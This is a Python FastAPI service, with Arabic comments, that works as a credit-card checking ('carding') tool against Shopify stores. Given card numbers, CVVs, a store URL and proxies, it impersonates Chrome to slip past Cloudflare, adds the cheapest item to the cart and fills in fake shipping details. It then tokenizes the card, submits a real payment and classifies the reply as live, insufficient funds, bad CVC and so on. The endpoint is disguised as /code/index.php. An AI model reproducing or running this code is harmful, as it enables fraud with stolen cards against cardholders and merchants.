from fastapi import FastAPI, Query
from fastapi.responses import JSONResponse
from curl_cffi.requests import AsyncSession
import re
import json
import random

app = FastAPI()

def format_proxy(proxy_str):
    if not proxy_str: return None
    parts = proxy_str.split(':')
    if len(parts) == 4:
        ip, port, user, pwd = parts
        return f"http://{user}:{pwd}@{ip}:{port}"
    elif len(parts) == 2:
        ip, port = parts
        return f"http://{ip}:{port}"
    return proxy_str if proxy_str.startswith('http') else f"http://{proxy_str}"

def extract_token_ultimate(html_text):
    """
    الرادار الشامل والنهائي: يبحث في الـ HTML، الـ JSON State، والروابط
    """
    patterns = [
        r'name="authenticity_token"\s*value="([^"]+)"',
        r'value="([^"]+)"\s*name="authenticity_token"',
        r'<meta\s+name="csrf-token"\s*content="([^"]+)"',
        r'"authenticity_token"\s*:\s*"([^"]+)"',
        r'authenticity_token\\u0022:\\u0022([^\\]+)\\u0022',
        r'token":"([a-f0-9]{32,})"', # JSON state token
        r'checkout_token":"([^"]+)"'
    ]
    for p in patterns:
        match = re.search(p, html_text)
        if match: 
            return match.group(1)
    return None

def extract_gateway(html_text):
    patterns = [
        r'name="checkout\[payment_gateway\]"\s*type="radio"\s*value="(\d+)"',
        r'value="(\d+)"\s*name="checkout\[payment_gateway\]"',
        r'"payment_instruments":\[{"id":(\d+)'
    ]
    for p in patterns:
        match = re.search(p, html_text)
        if match: return match.group(1)
    return "1"

async def get_cheapest_product(session, store_url):
    try:
        headers = {"Accept": "application/json"}
        res = await session.get(f"{store_url}/products.json?limit=250", headers=headers)
        if res.status_code != 200: return None, None
        
        data = res.json()
        cheapest_variant = None
        lowest_price = float('inf')
        
        for product in data.get('products', []):
            for variant in product.get('variants', []):
                if variant.get('available', True): 
                    try:
                        price = float(variant.get('price', 0.0))
                        if 0.0 < price < lowest_price:
                            lowest_price = price
                            cheapest_variant = variant.get('id')
                    except: pass
        
        return cheapest_variant, str(lowest_price) if cheapest_variant else (None, None)
    except:
        return None, None

async def check_shopify(cc_info, store_url, proxy):
    try:
        cc_parts = re.findall(r'\d+', cc_info.replace('|', ' '))
        if len(cc_parts) < 4: return {"Response": "Invalid CC Format", "Price": "-", "Gate": "Shopify API"}
        cc, mm, yy, cvv = cc_parts[0], cc_parts[1], cc_parts[2], cc_parts[3]
        if len(yy) == 2: yy = "20" + yy

        store_url = store_url.rstrip('/')
        formatted_proxy = format_proxy(proxy)
        proxies = {"http": formatted_proxy, "https": formatted_proxy} if formatted_proxy else None

        # استخدام متصفح Chrome حديث لتخطي Cloudflare بسلاسة
        async with AsyncSession(impersonate="chrome120", proxies=proxies, timeout=60) as session:
            
            # 1. سحب المنتج
            variant_id, price = await get_cheapest_product(session, store_url)
            if not variant_id:
                return {"Response": "No active products found or Site Dead", "Price": "-", "Gate": "Shopify API"}

            # 2. الإضافة للسلة بالطريقة الشرعية وتخطي الكاش
            add_url = f"{store_url}/cart/add.js?t={int(time.time() * 1000)}"
            add_data = {"id": str(variant_id), "quantity": "1"}
            add_headers = {
                "Accept": "application/json",
                "X-Requested-With": "XMLHttpRequest"
            }
            res2 = await session.post(add_url, data=add_data, headers=add_headers)
            if res2.status_code != 200: 
                return {"Response": "Cart Add Failed (Cloudflare/Anti-Bot Blocked)", "Price": f"${price}", "Gate": "Shopify API"}

            # 3. جلب رابط الدفع الحقيقي من السلة
            cart_res = await session.get(f"{store_url}/cart.js")
            checkout_final_url = f"{store_url}/checkout"
            
            # 4. الدخول لصفحة الدفع وسحب الـ Token
            res3 = await session.get(checkout_final_url, allow_redirects=True)
            checkout_html = res3.text
            checkout_final_url = str(res3.url) # تحديث الرابط في حال تم إعادة التوجيه
            
            auth_token = extract_token_ultimate(checkout_html)

            # إذا لم نجد التوكن، هذا يعني أننا في صفحة (Contact Info) أو (Cloudflare)
            if not auth_token:
                title_match = re.search(r'<title>([^<]+)</title>', checkout_html)
                page_title = title_match.group(1).strip() if title_match else "Unknown"
                
                if "Just a moment" in page_title or "Cloudflare" in page_title:
                    return {"Response": "Cloudflare Challenge Blocked Proxy IP", "Price": f"${price}", "Gate": "Shopify API"}
                
                # المحاولة الأخيرة: سحب التوكن من الـ Meta
                meta_match = re.search(r'<meta name="csrf-token" content="([^"]+)"', checkout_html)
                if meta_match:
                    auth_token = meta_match.group(1)
                else:
                    return {"Response": f"Token Not Found (Protected/Custom UI: {page_title[:15]})", "Price": f"${price}", "Gate": "Shopify API"}

            # 5. تعبئة العنوان والشحن (ضروري لفتح بوابة الدفع)
            email = f"john.doe{random.randint(1000,9999)}@gmail.com"
            address_payload = {
                "_method": "patch",
                "authenticity_token": auth_token,
                "previous_step": "contact_information",
                "step": "shipping_method",
                "checkout[email]": email,
                "checkout[shipping_address][first_name]": "John",
                "checkout[shipping_address][last_name]": "Doe",
                "checkout[shipping_address][address1]": "123 Main Street",
                "checkout[shipping_address][city]": "New York",
                "checkout[shipping_address][country]": "United States",
                "checkout[shipping_address][province]": "New York",
                "checkout[shipping_address][zip]": "10001",
                "checkout[shipping_address][phone]": "(212) 555-1234",
                "button": ""
            }
            res4 = await session.post(checkout_final_url, data=address_payload, allow_redirects=True)
            html4 = res4.text
            checkout_final_url = str(res4.url)

            auth_token2 = extract_token_ultimate(html4) or auth_token

            # تخطي الشحن
            shipping_payload = {
                "_method": "patch",
                "authenticity_token": auth_token2,
                "previous_step": "shipping_method",
                "step": "payment_method",
                "button": ""
            }
            res5 = await session.post(checkout_final_url, data=shipping_payload, allow_redirects=True)
            html5 = res5.text
            checkout_final_url = str(res5.url)

            auth_token3 = extract_token_ultimate(html5) or auth_token2
            gateway_id = extract_gateway(html5)

            # 6. تشفير البطاقة
            token_url = "https://deposit.us.shopifycs.com/sessions"
            token_payload = {"credit_card": {"number": cc, "name": "John Doe", "month": mm, "year": yy, "verification_value": cvv}}
            token_headers = {"Accept": "application/json", "Content-Type": "application/json"}
            
            res6 = await session.post(token_url, json=token_payload, headers=token_headers)
            if res6.status_code != 200: 
                return {"Response": "Failed to tokenize card (Proxy IP Banned by Shopify)", "Price": f"${price}", "Gate": "Shopify API"}
            
            payment_token = res6.json().get("id")

            # 7. إرسال الدفع
            payment_payload = {
                "_method": "patch",
                "authenticity_token": auth_token3,
                "previous_step": "payment_method",
                "step": "",
                "s": payment_token,
                "checkout[payment_gateway]": gateway_id, 
                "checkout[credit_card][vault]": "false",
                "checkout[different_billing_address]": "false",
                "complete": "1"
            }
            
            res7 = await session.post(checkout_final_url, data=payment_payload, allow_redirects=True)
            result_html = res7.text.lower()
            
            # 8. قراءة الرد
            if "thank you" in result_html or "order completed" in result_html or res7.url.endswith('/thank_you'):
                return {"Response": "Order completed 💎", "Price": f"${price}", "Gate": "Shopify API"}
            elif "insufficient funds" in result_html or "not enough funds" in result_html: 
                return {"Response": "Insufficient Funds", "Price": f"${price}", "Gate": "Shopify API"}
            elif "incorrect_cvc" in result_html or "security code was not matched" in result_html: 
                return {"Response": "Incorrect CVC", "Price": f"${price}", "Gate": "Shopify API"}
            elif "zip code does not match" in result_html or "avs" in result_html: 
                return {"Response": "ZIP Code Mismatch", "Price": f"${price}", "Gate": "Shopify API"}
            elif "do not honor" in result_html or "generic_decline" in result_html: 
                return {"Response": "Do Not Honor", "Price": f"${price}", "Gate": "Shopify API"}
            else:
                error_match = re.search(r'class="field__message field__message--error">([^<]+)<', res7.text)
                if error_match: return {"Response": error_match.group(1).strip(), "Price": f"${price}", "Gate": "Shopify API"}
                
                # إذا لم نجد رسالة خطأ صريحة
                if "payment" in result_html and "error" in result_html:
                     return {"Response": "Generic Payment Error", "Price": f"${price}", "Gate": "Shopify API"}
                     
                return {"Response": "Declined / Custom Error", "Price": f"${price}", "Gate": "Shopify API"}

    except Exception as e:
        err_str = str(e).lower().replace("proxy", "prx").replace("connection", "conn").replace("timeout", "t-out")
        return {"Response": f"Sys_Err: {err_str[:40]}", "Price": "-", "Gate": "Shopify API"}

@app.get("/code/index.php")
async def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query(None)):
    result = await check_shopify(cc, url, proxy)
    return JSONResponse(content=result)
